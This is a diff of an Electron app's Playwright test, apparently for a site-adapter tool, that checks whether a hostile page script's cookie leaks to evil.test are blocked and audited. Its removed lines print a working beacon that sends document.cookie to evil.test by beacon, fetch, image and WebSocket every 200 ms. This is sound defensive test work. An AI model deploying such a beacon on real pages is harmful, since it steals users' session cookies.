@@ -4,20 +4,20 @@
 // counts every connection and passes it on: an https attempt (the sink speaks plain HTTP, so no
 // request would parse and the sink would record nothing) still counts as having got out.
 //
-// Then the hostile variant: the fake's own www page turns hostile, as a compromised site's script
-// would, and beacons the page's cookies to evil.test every 200 ms by every route a page has (beacon,
-// fetch over http and https, image, WebSocket). The script is put into the tool partition's pages
-// from the main process (executeJavaScript runs in the page's main world, as the site's own scripts
-// do), because the fake has no page-script variant of its own and this suite may not change it.
-// Every attempt must be blocked, none may reach the sink, and each must be audited as request-blocked
-// with initiator page and partition tool, the origin only (never the query) as target: the ones made
-// during a tool's run with its call id (the runtime's), the ones between runs with none (the app's).
+// Then the hostile variant: the fake's own www pages turn hostile, as a compromised site's script
+// would (the fake's page beacon, turned on through the demo's e2e hook), and beacon the page's cookies
+// to evil.test every 200 ms by every route a page has (beacon, fetch over http and https, image,
+// WebSocket). It is the site's own inline script, in the page's main world. Every attempt must be
+// blocked, none may reach the sink, and each must be audited as request-blocked with initiator page
+// and partition tool, the origin only (never the query) as target: the ones made during a tool's run
+// with its call id (the runtime's), the ones between runs with none (the app's). The script counts its
+// rounds on <html>, so the test knows it really ran before it looks for leaks.
 
 import { readFileSync, rmSync } from 'node:fs'
 import { connect, createServer, type Server } from 'node:net'
 import { join } from 'node:path'
 import { expect, type Page, test } from '@playwright/test'
-import { type ExfilSink, startExfilSink } from '@siteadapter/fake-woolworths-site'
+import { BEACON_ROUNDS_ATTRIBUTE, type ExfilSink, startExfilSink } from '@siteadapter/fake-woolworths-site'
 import {
   appWindows,
   CONTROL,
@@ -85,6 +85,24 @@ function auditEvents(): { type: string; [key: string]: unknown }[] {
     .map((line) => (JSON.parse(line) as { event: { type: string } }).event)
 }
 
+/** The most beacon rounds any open tool-partition page has counted (read from an isolated world). */
+function beaconRounds(): Promise<number> {
+  return launched.app.evaluate(async ({ session, webContents }, attribute) => {
+    const tool = session.fromPartition('persist:tool:woolworths')
+    let most = 0
+    for (const contents of webContents.getAllWebContents()) {
+      if (contents.isDestroyed() || contents.session !== tool) continue
+      const rounds = await contents
+        .executeJavaScriptInIsolatedWorld(999, [
+          { code: `Number(document.documentElement.getAttribute(${JSON.stringify(attribute)}) ?? 0)` },
+        ])
+        .catch(() => 0)
+      most = Math.max(most, Number(rounds) || 0)
+    }
+    return most
+  }, BEACON_ROUNDS_ATTRIBUTE)
+}
+
 /** What reached evil.test after the self-tests: connections through the door, requests at the sink. */
 function leaks(): { connections: number; requests: string[] } {
   return {
@@ -124,40 +142,20 @@ test('approved and searched, the app itself sends nothing to evil.test', async (
 })
 
 test('a hostile page script beaconing to evil.test is blocked, and audited as the page’s', async () => {
-  // From now on every tool-partition page of this adapter runs the beacon, as its own script.
-  await launched.app.evaluate(
-    ({ session, webContents }, ports) => {
-      const tool = session.fromPartition('persist:tool:woolworths')
-      const beacon = `(() => {
-        const leak = encodeURIComponent(document.cookie || 'no-cookie')
-        const plain = 'http://evil.test:${ports.door}/beacon?c=' + leak
-        const tls = 'https://evil.test:${ports.door}/beacon?c=' + leak
-        const fire = () => {
-          try { navigator.sendBeacon(plain, leak) } catch {}
-          fetch(plain, { method: 'POST', body: leak, mode: 'no-cors' }).catch(() => {})
-          fetch(tls, { mode: 'no-cors' }).catch(() => {})
-          new Image().src = plain + '&img=1'
-          try { const ws = new WebSocket('ws://evil.test:${ports.door}/ws?c=' + leak); ws.onerror = () => {} } catch {}
-        }
-        fire()
-        setInterval(fire, 200)
-      })()`
-      const hostile = (contents: Electron.WebContents) => {
-        contents.on('dom-ready', () => {
-          if (!contents.getURL().startsWith('https://www.woolworths.test')) return
-          contents.executeJavaScript(beacon).catch(() => undefined)
-        })
-      }
-      // Pages already open (the tool page from the search) and any opened later.
-      for (const contents of webContents.getAllWebContents()) {
-        if (contents.session !== tool) continue
-        hostile(contents)
-        if (contents.getURL().startsWith('https://www.woolworths.test'))
-          contents.executeJavaScript(beacon).catch(() => undefined)
-      }
-    },
-    { door: doorPort },
-  )
+  // From now on every www page the fake serves carries the beacon, as its own script.
+  await launched.app.evaluate((_electron, port) => {
+    const hook = (
+      globalThis as { __siteadapterE2e?: { pageBeacon(t: { host: string; port: number }): void } }
+    ).__siteadapterE2e
+    if (hook === undefined) throw new Error('not an e2e launch of a demo build')
+    hook.pageBeacon({ host: 'evil.test', port })
+  }, doorPort)
+  // The tool page from the search loaded before that: close it, so the next run opens a fresh one.
+  await launched.app.evaluate(({ BrowserWindow, session }) => {
+    const tool = session.fromPartition('persist:tool:woolworths')
+    for (const window of BrowserWindow.getAllWindows())
+      if (window.webContents.session === tool) window.destroy()
+  })
 
   // Tool runs while the page keeps beaconing: each run's policy refuses them and the runtime audits
   // them with the call's id.
@@ -167,8 +165,12 @@ test('a hostile page script beaconing to evil.test is blocked, and audited as th
     // tool still answers.
     expect(result.isError, result.text).toBe(false)
   }
+  // The beacon really ran: rounds are counted on the tool page.
+  await expect.poll(beaconRounds, { timeout: 10_000 }).toBeGreaterThanOrEqual(2)
   // And between runs, with no tool running: the app audits those, with no call id.
+  const before = await beaconRounds()
   await new Promise((done) => setTimeout(done, 1500))
+  expect(await beaconRounds()).toBeGreaterThan(before)
 
   expect(leaks()).toEqual({ connections: 0, requests: [] })
 
